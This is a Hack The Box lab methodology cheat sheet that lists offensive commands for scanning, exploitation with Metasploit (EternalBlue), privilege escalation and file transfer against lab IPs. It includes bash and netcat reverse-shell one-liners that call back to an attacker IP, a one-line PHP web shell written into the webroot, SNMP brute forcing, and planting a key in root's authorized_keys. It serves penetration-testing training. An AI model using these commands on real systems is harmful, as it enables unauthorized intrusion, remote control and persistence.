# HTB Machine Methodology Cheat Sheet

## 🧭 Command Reference Table

### 🔍 Service Scanning

| Command | Description |
|--------|-------------|
| `nmap 10.129.42.253` | Basic port scan |
| `nmap -sV -sC -p- 10.129.42.253` | Full port scan with version detection and default scripts |
| `locate scripts/citrix` | Find specific nmap scripts |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Run specific nmap script on port |
| `netcat 10.10.10.10 22` | Banner grabbing on SSH port |
| `smbclient -N -L \\\\10.129.42.253` | List SMB shares anonymously |
| `smbclient \\\\10.129.42.253\\users` | Connect to specific SMB share |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | SNMP enumeration |
| `onesixtyone -c dict.txt 10.129.42.254` | SNMP community string brute force |

### 🌐 Web Enumeration

| Command | Description |
|--------|-------------|
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Directory brute force |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Subdomain enumeration |
| `curl -IL https://www.inlanefreight.com` | Get HTTP headers |
| `whatweb 10.10.10.121` | Web technology identification |
| `curl 10.10.10.121/robots.txt` | Check robots.txt file |
| `Ctrl+U` | View page source in browser |

### 💥 Public Exploits

| Command | Description |
|--------|-------------|
| `searchsploit openssh 7.2` | Search for exploits |
| `msfconsole` | Start Metasploit Framework |
| `search exploit eternalblue` | Search Metasploit for exploits |
| `use exploit/windows/smb/ms17_010_psexec` | Select Metasploit module |
| `show options` | Show module options |
| `set RHOSTS 10.10.10.40` | Set target in Metasploit |
| `check` | Check if target is vulnerable |
| `exploit` | Run the exploit |

### 🐚 Using Shells

| Command | Description |
|--------|-------------|
| `nc -lvnp 1234` | Start netcat listener |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Reverse shell using bash |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f` | Reverse shell with named pipe |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f` | Bind shell with named pipe |
| `nc 10.10.10.1 1234` | Connect to bind shell |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell TTY (method 1) |
| `Ctrl+Z`, `stty raw -echo`, `fg`, Enter twice | Upgrade shell TTY (method 2) |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create PHP web shell |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute command via web shell |

### 🔐 Privilege Escalation

| Command | Description |
|--------|-------------|
| `./linpeas.sh` | Run Linux privilege escalation script |
| `sudo -l` | List available sudo privileges |
| `sudo -u user /bin/echo Hello World!` | Run command as specific user |
| `sudo su -` | Switch to root user |
| `sudo su user -` | Switch to specific user |
| `ssh-keygen -f key` | Generate SSH key pair |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Add public key to authorized_keys |
| `ssh root@10.10.10.10 -i key` | SSH with private key |

### 📁 Transferring Files

| Command | Description |
|--------|-------------|
| `python3 -m http.server 8000` | Start HTTP file server |
| `wget http://10.10.14.1:8000/linpeas.sh` | Download file via HTTP |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download file via curl |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | Secure copy file to remote host |
| `base64 shell -w 0` | Encode file to base64 |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell` | Decode base64 to file |
| `md5sum shell` | Verify file integrity |
